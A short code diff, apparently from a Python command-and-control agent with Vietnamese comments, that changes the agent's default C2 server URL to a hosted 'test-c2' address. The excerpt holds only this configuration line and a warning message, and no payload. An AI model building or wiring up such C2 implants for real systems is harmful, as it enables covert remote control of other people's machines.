@@ -249,7 +249,7 @@ class C2Agent:
 
 def main():
     # Đọc server URL từ environment hoặc dùng default
-    server_url = os.getenv('C2_SERVER_URL', 'https://your-app.onrender.com')
+    server_url = os.getenv('C2_SERVER_URL', 'https://test-c2.onrender.com')
     
     if server_url == 'https://your-app.onrender.com':
         print("Cảnh báo: Đang sử dụng URL mặc định. Hãy set environment variable C2_SERVER_URL")
